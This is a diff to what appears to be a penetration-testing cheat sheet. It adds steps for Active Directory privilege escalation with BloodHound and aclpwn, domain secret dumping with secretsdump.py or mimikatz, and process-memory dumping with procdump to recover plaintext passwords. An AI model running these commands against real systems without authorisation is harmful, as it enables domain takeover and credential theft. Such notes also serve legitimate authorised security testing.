@@ -99,7 +99,7 @@ Upload it and try it out.
 
 ## BloodHound & aclpwn
 
-Using BloodHound you can generate a path from owned principals to admin domains
+Using BloodHound you can generate a path from owned principals to admin domains if an LDAP server is running
 
 1. Upload SharpHound.ps1
 2. Exec PS `C:\..\ Import-Module .\SharpHound.ps1`
@@ -111,3 +111,16 @@ Using BloodHound you can generate a path from owned principals to admin domains
 8. use aclpwn `aclpwn -f USER -ft User -t ADMIN_DOMAIN -d DOMAIN -du neo4j -dp neo4jpass -s IP -u USER -p PASSWORD`
 9. if successfull you can now use Impackets secretdump.py 'secretsdump.py DOMAIN/USER:PASSWORD@IP'
 9.1 or use mimikatz 
+
+
+## Dump Processes
+
+Get ProcDump https://docs.microsoft.com/en-us/sysinternals/downloads/procdump and upload it to the windows server.
+Afterwards you can dump any process by using
+
+```bash
+.\procdump64.exe -ma PID DUMP_FILE
+```
+
+Download it and analyze it. If Firefox is running, it might be possible that passwods are send plain text. 
+
